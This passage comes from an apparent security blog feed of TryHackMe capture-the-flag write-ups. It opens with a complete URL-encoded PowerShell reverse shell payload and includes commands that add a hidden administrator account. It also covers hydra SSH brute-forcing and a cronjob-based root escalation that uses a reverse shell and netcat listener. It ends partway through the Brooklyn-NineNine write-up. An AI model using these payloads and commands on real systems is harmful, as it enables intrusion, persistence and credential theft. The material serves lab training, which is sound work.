powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&amp;lt;IP&amp;gt;%27%2C&amp;lt;PORT&amp;gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code. 

# Next Steps

Ok, we have a shell. Now what?

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/&amp;lt;user&amp;gt;/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

net user &amp;lt;username&amp;gt; &amp;lt;password&amp;gt; /add

net localgroup administrators &amp;lt;username&amp;gt; /add

The important take away from this task:

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a &quot;normal&quot; method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Tue, 27 Oct 2020 00:00:00 +0000</pubDate>
        <link>/blog/whatashell/</link>
        <guid isPermaLink="true">/blog/whatashell/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Easy-Peasy</title>
        <description>&lt;h1 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h1&gt;

&lt;p&gt;Used gobuster&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;gobuster dir -u http://10.10.201.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/td&gt;
          &lt;td&gt;tee gobuster-output.txt&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;found hidden directory&lt;/p&gt;

&lt;p&gt;after researching the site, nothing interesting was found on the website.&lt;/p&gt;

&lt;p&gt;But for the answer of TryHackMe, something has to be on the site. 
So i keep digging around on the webserver.&lt;/p&gt;

&lt;p&gt;I tried another gobuster run on the hidden directory.&lt;/p&gt;

&lt;p&gt;Found another directory. 
Was another picture and then i checked the source code. In the Source code there was a hidden paragraph:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Z**********************=&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No i have my first flag, the code was Base64. 
we can decode the base64 string in the terminal:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d㉿fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;************************&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;f&lt;span class=&quot;k&quot;&gt;********&lt;/span&gt;g&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a lot of seraching on Port 80 on the Server, i was swtiching to the other Webserver witch is running on port 65524.&lt;/p&gt;

&lt;p&gt;On this webserver i also run a gobuster run, and found robots.txt file. 
looked inside the robots.txt file and found a hash.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The hash was crackable with only one website. after decypting the hash we got our second flag.&lt;/p&gt;

&lt;p&gt;On The apache website there is the third flag locatet, we have to look closely. :)&lt;/p&gt;

&lt;p&gt;For the hidden directory. i was going through the source code of the apache server. i found an interessting part with a string who looks like a hash:&lt;/p&gt;
&lt;p hidden=&quot;&quot;&gt;its encoded with ba....:O**********************u&lt;/p&gt;

&lt;p&gt;i was triying to decrypt the hash with base64, but it was no base64 hash. I tried different ways till i found the right base decoder. 
The string gave me the name of the hidden directory.&lt;/p&gt;

&lt;p&gt;http://10.10.249.230:65524/n&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;***r/&lt;/p&gt;

&lt;p&gt;on this page we found another hash. Whitch we have to decrpt. 
Also a picture was provided on this site.&lt;/p&gt;

&lt;p&gt;Downloaded the picture and started brute force attack on the picture with the txt file which we have donwloaded from tryhackem.&lt;/p&gt;

&lt;p&gt;a other way is to crack the password with hashcat, as a hint from tryhackme. the has is GOST.&lt;/p&gt;

&lt;p&gt;The txt file was containg the password, and extracted a new text file where a username and password was stored.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d㉿fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;s&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt; binarycodepixabay.jpg easypeasy.txt                                                               1 ⨯
S&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt; 2.0.9 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/Paradoxis/s&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 - Luke Paris &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Paradoxis&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Counting lines &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;wordlist..
Attacking file &lt;span class=&quot;s1&quot;&gt;'binarycodepixabay.jpg'&lt;/span&gt; with wordlist &lt;span class=&quot;s1&quot;&gt;'easypeasy.txt'&lt;/span&gt;..
Successfully cracked file with password: m&lt;span class=&quot;k&quot;&gt;******************&lt;/span&gt;b
Tried 3585 passwords
Your file has been written to: binarycodepixabay.jpg.out
m&lt;span class=&quot;k&quot;&gt;******************&lt;/span&gt;b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat binarycodepixabay.jpg.out 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: binarycodepixabay.jpg.out
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ username:b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;g
   2   │ password:
   3   │ 01101001 &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
       │ &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
       │ &lt;span class=&quot;k&quot;&gt;******&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt; 01111001
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The password was decoded in binary. after decoding we have now the password for the user to the target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i&lt;span class=&quot;k&quot;&gt;**************************&lt;/span&gt;y
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now login with the user and read the user.txt file.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d㉿fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; ssh 10.10.249.230 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 6498 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;g &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; i&lt;span class=&quot;k&quot;&gt;**************************&lt;/span&gt;y
&lt;span class=&quot;k&quot;&gt;*************************************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;        This connection are monitored by government offical          &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;            Please disconnect &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you are not authorized        &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; A lawsuit will be filed against you &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the law is not followed      &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*************************************************************************&lt;/span&gt;
b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;g@10.10.249.230&lt;span class=&quot;s1&quot;&gt;'s password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
b****g@kral4-PC:~$ ls
user.txt
b****g@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
s**t{a**************y}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some researching i came a cross the cronjob.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;g@kral4-PC:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab 
&lt;span class=&quot;c&quot;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Unlike any other crontab you don't have to run the `crontab'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# command to install the new version when you edit this file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# that none of the other crontabs do.&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;span class=&quot;c&quot;&gt;# m h dom mon dow user  command&lt;/span&gt;
17 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.hourly
25 6  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root  &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.daily &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
47 6  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 7 root  &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.weekly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
52 6  1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root  &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.monthly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;bash .mysecretcronjob.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;on cronjob is running as root. I added a reverse shell to the file and a listener on my machine.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;g@kral4-PC:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano var/www/.mysecretcronjob.sh 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;root-shell&quot;&gt;root shell&lt;/h1&gt;

&lt;p&gt;After some seconds i got a root shell. now we can read the root.txt file&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d㉿fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 8080
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.9.170.39] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.249.230] 53294
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1509&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@kral4-PC:/var/www# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt  
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt 
flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
root@kral4-PC:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;summary&lt;/p&gt;

&lt;p&gt;This box was a lot enumeration with gobuster. Sometimes i was stucked at this. I tried some different ways but i was really fustrated that i read another writeup for the room.&lt;/p&gt;
</description>
        <pubDate>Mon, 12 Oct 2020 00:00:00 +0000</pubDate>
        <link>/blog/easypeasy/</link>
        <guid isPermaLink="true">/blog/easypeasy/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Brooklyn-NineNine</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Brooklyn NineNine&lt;/td&gt;
      &lt;td&gt;06.10.2020&lt;/td&gt;
      &lt;td&gt;easy&lt;/td&gt;
      &lt;td&gt;security, nmap, gobuster, pentest&lt;/td&gt;
      &lt;td&gt;–&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN nmap/initial $ip -Pn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;ftp $ip&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;hydra&lt;/td&gt;
      &lt;td&gt;hydra -t 16 -l j*** -P /usr/share/wordlists/rockyou.txt 10.10.93.39 ssh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;ssh j***@10.10.93.39&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;stegcracker&lt;/td&gt;
      &lt;td&gt;s&lt;strong&gt;**&lt;/strong&gt;*** brooklyn99.jpg /usr/share/wordlists/rockyou.txt&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;open-ports&quot;&gt;open ports&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;http&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;On this room, there where 2 Ways to get to the root flag. 
So i decided to check if i found both ways into the target.&lt;/p&gt;

&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;

&lt;h3 id=&quot;first-way&quot;&gt;First Way&lt;/h3&gt;

&lt;p&gt;First we are starting with the namp Scan on the target. 
Beside this, i was running a gobuster scan, but there was nothing interessting on the results.&lt;/p&gt;

&lt;h3 id=&quot;nmap-scan&quot;&gt;nmap Scan&lt;/h3&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat nmap/initial    
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nmap/initial
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ &lt;span class=&quot;c&quot;&gt;# Nmap 7.80 scan initiated Mon Oct  5 20:18:55 2020 as: nmap -sC -sV -oN nmap/initial 10.10.93.39&lt;/span&gt;
   2   │ Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.93.39
   3   │ Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.075s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
   4   │ Not shown: 997 closed ports
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 3.0.3
   7   │ | ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   8   │ |_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
   9   │ | ftp-syst: 
  10   │ |   STAT: 
  11   │ | FTP server status:
  12   │ |      Connected to ::ffff:10.11.3.139
  13   │ |      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
  14   │ |      TYPE: ASCII
  15   │ |      No session bandwidth limit
  16   │ |      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
  17   │ |      Control connection is plain text
  18   │ |      Data connections will be plain text
  19   │ |      At session startup, client count was 1
  20   │ |      vsFTPd 3.0.3 - secure, fast, stable
  21   │ |_End of status
  22   │ 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  23   │ | ssh-hostkey: 
  24   │ |   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  25   │ |   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  26   │ |_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
